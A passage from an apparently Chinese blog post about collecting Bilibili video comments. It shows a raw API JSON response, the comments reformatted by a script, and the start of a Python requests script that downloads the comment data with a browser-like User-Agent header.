class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;is_senior_member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;senior&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;level_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;current_level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;current_min&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;current_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;next_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;pendant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1758</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;至尊戒&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i2.hdslb.com/bfs/garb/item/025d07fa04d38236bc2258be2faf2867e2c48fe1.png&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;expire&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;image_enhance&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i2.hdslb.com/bfs/garb/item/025d07fa04d38236bc2258be2faf2867e2c48fe1.png&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;image_enhance_frame&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;n_pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1758</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;nameplate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;nid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;image_small&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;official_verify&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;vip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;vipType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;vipDueDate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1779897600000</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;dueRemark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;accessStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;vipStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;vipStatusWarn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;themeType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://i0.hdslb.com/bfs/vip/label_annual.png&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;年度大会员&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;label_theme&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;annual_vip&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;text_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#FFFFFF&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;bg_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;bg_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#FB7299&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;border_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;use_img_label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;img_label_uri_hans&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;img_label_uri_hant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;img_label_uri_hans_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/vip/8d4f8bfc713826a5412a0a27eaaac4d6b9ede1d9.png&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;img_label_uri_hant_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/activity-plat/static/20220614/e369244d0b14644f5e1a06431e22a4d5/VEW8fCC0hg.png&quot;</span><br>                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;avatar_subscript&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;nickname_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#FB7299&quot;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">&#125;</span><br>                    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;jump_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;replies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;assist&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;up_action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;reply&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;invisible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;reply_control&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;time_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3天前发布&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;translation_switch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;folder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;has_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rule&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dynamic_id_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;note_cvid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;track_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;top&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;upper&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;vote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;top_replies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;effects&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;preloading&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;assist&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;blacklist&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;vote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;showtopic&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;show_up_flag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;read_only&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;upper&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">455215669</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;control&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;input_disable&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;root_input_text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你渴望拥有力量吗？评论让力量更强大&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;child_input_text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你渴望拥有力量吗？评论让力量更强大&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;giveup_input_text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;不发没关系，请继续友善哦~&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;screenshot_icon_state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;upload_picture_icon_state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;answer_guide_text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;需要升级成为lv2会员后才可以评论，先去答题转正吧！&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;answer_guide_icon_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://i0.hdslb.com/bfs/emote/96940d16602cacbbac796245b7bb99fa9b5c970c.png&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;answer_guide_ios_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.bilibili.com/h5/newbie/entry?navhide=1&amp;re_src=12&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;answer_guide_android_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.bilibili.com/h5/newbie/entry?navhide=1&amp;re_src=6&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;bg_text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;empty_page&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;show_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;show_text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;web_selection&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;disable_jump_emote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;enable_charged&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;enable_cm_biz_helper&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;preload_resources&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;note&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;callbacks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>用脚本处理了一下，变成下面这样：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs subunit">Comment 1:<br>User: Coronacosmo<br>Avatar: https://i0.hdslb.com/bfs/face/e49b2e87e33d846938fa33feac6566f439a0c1a8.jpg<br>Message: [热词系列_大师球]<br><span class="hljs-keyword">Time:</span> 2025<span class="hljs-string">-08</span><span class="hljs-string">-11</span> 09:29:09<br>Likes: 1<br>Replies: 1<br>Comment ID: 272139796528<br>Root Comment ID: 0<br>Reply to Comment ID: 0<br>--------------------------------------------------<br>Comment 2:<br>User: Aidemofashi_<br>Avatar: https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg<br>Message: 666，[星星眼]<br><span class="hljs-keyword">Time:</span> 2025<span class="hljs-string">-08</span><span class="hljs-string">-11</span> 13:07:30<br>Likes: 0<br>Replies: 0<br>Comment ID: 270904965281<br>Root Comment ID: 272139796528<br>Reply to Comment ID: 272139796528<br>--------------------------------------------------<br>Comment 3:<br>User: PRTShark<br>Avatar: https://i1.hdslb.com/bfs/face/d361e576cfb2250c697dcef03c978df3189a5a8a.jpg<br>Message: 没事了，我把”@“给关了<br><span class="hljs-keyword">Time:</span> 2025<span class="hljs-string">-08</span><span class="hljs-string">-11</span> 17:45:54<br>Likes: 1<br>Replies: 0<br>Comment ID: 270933519921<br>Root Comment ID: 0<br>Reply to Comment ID: 0<br>--------------------------------------------------<br>Comment 4:<br>User: Aidemofashi_<br>Avatar: https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg<br>Message: emojitest 😁😂😃😄👿😉😊☺️😌😍😏😒😓😔😘😚😜😝😞😠😡😢😣😥😨😪😭😰😱😲😳😷🙃😋😗😛🤑🤓😎🤗🙄🤔😩😤🤐🤒😴😀😆😅😇🙂😙😟😕☹️😫😶😐😑😯😦😧😮😵😬🤕😈👻🥺🥴🤣🥰🤩🤤🤫🤪🧐🤬🤧🤭🤠🤯🤥🥳🤨🤢🤡🤮🥵🥶💩☠️💀👽👾👺👹🤖<br><span class="hljs-keyword">Time:</span> 2025<span class="hljs-string">-08</span><span class="hljs-string">-11</span> 18:01:57<br>Likes: 0<br>Replies: 0<br>Comment ID: 270935559601<br>Root Comment ID: 0<br>Reply to Comment ID: 0<br>--------------------------------------------------<br>Comment 5:<br>User: Aidemofashi_<br>Avatar: https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg<br>Message: @不起名发不了评论<br><span class="hljs-keyword">Time:</span> 2025<span class="hljs-string">-08</span><span class="hljs-string">-11</span> 18:05:16<br>Likes: 0<br>Replies: 0<br>Comment ID: 270936082385<br>Root Comment ID: 0<br>Reply to Comment ID: 0<br>--------------------------------------------------<br>Comment 6:<br>User: Aidemofashi_<br>Avatar: https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg<br>Message: datatest[星星眼]<br><span class="hljs-keyword">Time:</span> 2025<span class="hljs-string">-08</span><span class="hljs-string">-11</span> 16:38:22<br>Likes: 0<br>Replies: 0<br>Comment ID: 270926105521<br>Root Comment ID: 0<br>Reply to Comment ID: 0<br>--------------------------------------------------<br>Comment 7:<br>User: Aidemofashi_<br>Avatar: https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg<br>Message: @PRTShark<br><span class="hljs-keyword">Time:</span> 2025<span class="hljs-string">-08</span><span class="hljs-string">-11</span> 16:38:34<br>Likes: 0<br>Replies: 0<br>Comment ID: 270926184193<br>Root Comment ID: 0<br>Reply to Comment ID: 0<br>--------------------------------------------------<br><br></code></pre></td></tr></table></figure><p>把自己需要的提取出来就差不多了，下面是爬取和处理数据的脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_and_save_as_json</span>(<span class="hljs-params">url, file_name=<span class="hljs-string">&#x27;response_data.json&#x27;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    使用伪装的请求头访问指定的URL，并将返回的数据保存为JSON文件</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    参数:</span><br><span class="hljs-string">        url (str): 要访问的URL</span><br><span class="hljs-string">        file_name (str): 保存的文件名，默认为&#x27;response_data.json&#x27;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    返回:</span><br><span class="hljs-string">        bool: 操作是否成功</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 模拟正常浏览器请求头</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 发送HTTP GET请求，包含伪装的请求头</span><br>        response = requests.get(url, headers=headers)<br>        <br>        <span class="hljs-comment"># 如果请求成功，响应状态码应该是200</span><br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-comment"># 尝试将响应内容解析为JSON</span><br>            <span class="hljs-keyword">try</span>:<br>                data = response.json()<br>            <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;响应内容不是有效的JSON格式&quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <br>            <span class="hljs-comment"># 将数据保存为JSON文件</span><br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> json_file:<br>                json.dump(data, json_file, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">4</span>)<br>            <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;数据已成功保存到文件：<span class="hljs-subst">&#123;file_name&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求过程中发生错误：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 示例URL，可以根据需要修改</span><br>    url = <span class="hljs-string">&quot;https://api.bilibili.com/x/v2/reply/wbi/main?oid=362747247&amp;type=11&amp;mode=3&amp;pagination_str=%7B%22offset%22:%22%22%7D&amp;plat=1&amp;seek_rpid=&amp;web_location=1315875&amp;w_rid=0e13dd54df5a4aa989eb972b1ce585c4&amp;wts=1754889283&quot;</span><br>    <br>    <span class="hljs-comment"># 调用函数</span><br>    